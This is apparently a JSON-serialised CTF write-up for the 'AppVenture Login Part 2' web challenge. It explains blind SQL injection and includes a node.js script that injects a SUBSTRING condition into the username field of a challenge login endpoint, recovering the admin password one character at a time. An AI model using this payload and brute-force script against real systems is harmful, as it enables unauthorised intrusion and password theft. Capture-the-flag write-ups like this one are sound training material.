{"_path":"/ctf/2021-appventure-ctf/web/appventure-login-part-2","_dir":"web","_draft":false,"_partial":false,"_locale":"","title":"AppVenture Login Part 2","description":"","created":"2021-12-21T23:50","updated":"2024-06-10T23:38","body":{"type":"root","children":[{"type":"element","tag":"h2","props":{"id":"appventure-login-part-2"},"children":[{"type":"text","value":"AppVenture Login Part 2"}]},{"type":"element","tag":"blockquote","props":{},"children":[{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Ok, you got the flag, but I bet you'll never get my password!"}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Basing off the description, the flag is probably the password. Even though we logged in as admin in the last challenge, we do not know of the password."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"To get the password, we can check the password 1 character at a time to reduce the number of tries. Trying the entire password string at a time require exponential amount of tries and will be unrealistic."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"The flag format is "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"flag{...}"}]},{"type":"text","value":" where characters consist of lower case letters, "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"{}"}]},{"type":"text","value":" and "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"_"}]},{"type":"text","value":". We can quickly code up a little script to find the password. In this writeup we will be using "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"node.js"}]},{"type":"text","value":" for the simplicity and non-pythonic syntax."}]},{"type":"element","tag":"pre","props":{"code":"const fetch = require(\"node-fetch\");\nconst FormData = require('form-data');\n\nlet chars = \"abcdefghijklmnopqrstuvwxyz_{}\".split('');\nlet password = [];\n\nasync function verify(i, c) {\n    const form = new FormData();\n    form.append('username', `admin' and SUBSTRING(password, ${i + 1}, 1)='${c}' --`);\n    const res = await fetch('http://35.240.143.82:4208/login', {method: 'POST', body: form})\n    const text = await res.text();\n    return text !== \"Login failed\"\n}\n\nasync function step(i) {\n    for (let c of chars) {\n        if (await verify(i, c)) return c;\n    }\n    return null;\n}\n\nasync function brute_force() {\n    let i = 0;\n    while (true) {\n        password[i] = await step(i);\n        console.log(password.join(''));\n        if (!password[i]) break;\n        i++;\n    }\n    console.log(password.join(''));\n}\n\nbrute_force();\n","language":"js","meta":"","className":"language-js shiki shiki-themes github-light github-dark monokai","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#D73A49;--shiki-dark:#F97583;--shiki-sepia:#66D9EF;--shiki-default-font-style:inherit;--shiki-dark-font-style:inherit;--shiki-sepia-font-style:italic"},"children":[{"type":"text","value":"const"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#005CC5;--shiki-dark:#79B8FF;--shiki-sepia:#F8F8F2"},"children":[{"type":"text","value":" fetch"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#D73A49;--shiki-dark:#F97583;--shiki-sepia:#F92672"},"children":[{"type":"text","value":" ="}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#6F42C1;--shiki-dark:#B392F0;--shiki-sepia:#A6E22E"},"children":[{"type":"text","value":" require"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#24292E;--shiki-dark:#E1E4E8;--shiki-sepia:#F8F8F2"},"ch